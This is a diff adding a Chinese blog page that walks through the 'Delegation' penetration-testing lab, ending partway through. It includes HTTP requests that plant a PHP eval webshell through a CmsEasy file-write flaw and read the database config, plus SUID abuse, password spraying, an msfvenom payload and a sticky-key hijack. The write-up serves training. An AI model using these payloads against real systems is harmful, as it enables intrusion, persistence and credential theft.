@@ -1,0 +1,1176 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  
+    <link rel="canonical" href="https://www.dr0n.top/posts/58271769/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dr0n">
+  <meta name="keywords" content="ctf, writeups, web, misc">
+  
+    <meta name="description" content="Delegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。  前置知识: linux提权笔记内网渗透学习(代理篇)域渗透学习(Credentials篇)windows提权笔记域渗透学习(NTLM篇">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境 Delegation">
+<meta property="og:url" content="https://www.dr0n.top/posts/58271769/index.html">
+<meta property="og:site_name" content="Dr0n&#39;s blog">
+<meta property="og:description" content="Delegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。  前置知识: linux提权笔记内网渗透学习(代理篇)域渗透学习(Credentials篇)windows提权笔记域渗透学习(NTLM篇">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-3.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-4.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-5.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-6.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-7.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-8.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-11.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-9.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-17.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-18.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-10.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-12.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-13.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-14.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-16.png">
+<meta property="article:published_time" content="2026-06-26T09:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-24T07:26:26.382Z">
+<meta property="article:author" content="dr0n">
+<meta property="article:tag" content="专业徽章">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="春秋云境">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-1.png">
+  
+  
+  
+  <title>春秋云境 Delegation - Dr0n&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e509bf56906f797e00a96ebece6ea445","google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"openkounter":{"server_url":"https://v.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e509bf56906f797e00a96ebece6ea445";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-456TDFZC89", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-456TDFZC89');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dr0n&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>时间轴</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://awd.dr0n.top/" target="_self">
+                <i class="iconfont icon-docker"></i>
+                <span>awd</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>时间轴</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>友链</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="https://awd.dr0n.top/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-docker"></i>
+                  <span>awd</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云境 Delegation"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        dr0n
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-06-26 17:00" pubdate>
+          2026年6月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          65 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="openkounter-page-views-container" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="openkounter-page-views"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云境 Delegation</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>Delegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
+</blockquote>
+<p>前置知识:</p>
+<p><a href="/posts/fcb3a8d7/">linux提权笔记</a><br><a href="/posts/52375b43/">内网渗透学习(代理篇)</a><br><a href="/posts/e0ff8995/">域渗透学习(Credentials篇)</a><br><a href="/posts/a04618bd/">windows提权笔记</a><br><a href="/posts/3f5b8fbe/">域渗透学习(NTLM篇)</a><br><a href="/posts/7fde5404/">域渗透学习(Kerberos篇)</a></p>
+<h1 id="入口（172-22-4-36）"><a href="#入口（172-22-4-36）" class="headerlink" title="入口（172.22.4.36）"></a>入口（172.22.4.36）</h1><p>fscan没扫到啥东西</p>
+<p>访问 &#x2F;admin 可以看到 Powered by CmsEasy V.7752</p>
+<p>admin&#x2F;123456 弱口令进入后台</p>
+<p>存在<a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">后台任意文件写入和任意文件读取</a></p>
+<p>写入shell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.101.128.141<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://39.101.128.141/index.php?admin_dir=admin&amp;site=default<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=87762D6726B0AE8F4618CF513169A6C3; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1782458048; HMACCOUNT=053DB4DD3A650D71; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1782459132; PHPSESSID=bm59ctp9akb0379svgue7pi57j; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>75<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-php-template"><span class="language-xml">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span></span><br></code></pre></td></tr></table></figure>
+
+<p>读取文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?case=template&amp;act=fetch&amp;admin_dir=admin&amp;site=default</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.101.128.141<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://39.101.128.141/index.php?admin_dir=admin&amp;site=default<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=87762D6726B0AE8F4618CF513169A6C3; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1782458048; HMACCOUNT=053DB4DD3A650D71; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1782459132; PHPSESSID=bm59ctp9akb0379svgue7pi57j; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-applescript"><span class="hljs-built_in">id</span>=<span class="hljs-comment">#data_d_.._d_.._d_.._d_config_d_config_database.php</span></span><br></code></pre></td></tr></table></figure>
+
+<p>连上shell后suid提权</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>diff可用</p>
+<p><code>diff --line-format=%L /dev/null /home/flag/flag01.txt</code></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-2.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>建立代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> ./iox proxy -l 6666 &amp;<br></code></pre></td></tr></table></figure>
+
+<p>fscan</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.4.36:3306</span> open<br><span class="hljs-number">172.22.4.7:445</span> open<br><span class="hljs-number">172.22.4.45:445</span> open<br><span class="hljs-number">172.22.4.19:445</span> open<br><span class="hljs-number">172.22.4.7:139</span> open<br><span class="hljs-number">172.22.4.19:135</span> open<br><span class="hljs-number">172.22.4.19:139</span> open<br><span class="hljs-number">172.22.4.45:139</span> open<br><span class="hljs-number">172.22.4.7:135</span> open<br><span class="hljs-number">172.22.4.45:135</span> open<br><span class="hljs-number">172.22.4.45:80</span> open<br><span class="hljs-number">172.22.4.36:80</span> open<br><span class="hljs-number">172.22.4.36:22</span> open<br><span class="hljs-number">172.22.4.36:21</span> open<br><span class="hljs-number">172.22.4.7:88</span> open<br><span class="hljs-string">[*]</span> NetInfo<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">7</span><br>   <span class="hljs-string">[-&gt;]</span>DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">7</span><br><span class="hljs-string">[*]</span> NetInfo<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">45</span><br>   <span class="hljs-string">[-&gt;]</span>WIN19<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">45</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">45</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">45</span>     XIAORANG\WIN19<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">19</span>     FILESERVER.xiaorang.lab             Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetInfo<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">19</span><br>   <span class="hljs-string">[-&gt;]</span>FILESERVER<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">19</span><br><span class="hljs-string">[*]</span> OsInfo <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">7</span>	(Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">7</span>      <span class="hljs-string">[+]</span> DC:DC01.xiaorang.lab             Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">4</span>.<span class="hljs-number">36</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">68100</span>  title:中文网页标题<br></code></pre></td></tr></table></figure>
+
+<p>总结</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.4.7</span>  DC01.xiaorang.lab<br><span class="hljs-number">172.22.4.45</span>  XIAORANG\WIN19<br><span class="hljs-number">172.22.4.19</span>  FILESERVER.xiaorang.lab<br><span class="hljs-number">172.22.4.36</span>  入口主机<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="WIN19（172-22-4-45）"><a href="#WIN19（172-22-4-45）" class="headerlink" title="WIN19（172.22.4.45）"></a>WIN19（172.22.4.45）</h2><p>根据flag1中的提示进行爆破 Adrian 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 -q crackmapexec smb 172.22.4.45 -u <span class="hljs-string">&#x27;Adrian&#x27;</span> -p rockyou.txt -d WIN19 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>得到 Adrian:babygirl1</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>windows下远程登录会报错</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>在linux下登录后修改密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 rdesktop 172.22.4.45<br></code></pre></td></tr></table></figure>
+
+<p>桌面有一个跑完的 <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">privescheck</a></p>
+<p>其中注册表有权限修改</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-5.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>方法一：映像劫持</strong></p>
+<p>msf 生成一个恶意文件，指向桌面的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/exec cmd=<span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\evil.bat&quot;</span> --platform windows -f exe-service &gt; evil.exe<br></code></pre></td></tr></table></figure>
+
+
+<p>桌面写上需要执行的 bat，这里把粘滞键替换成了cmd</p>
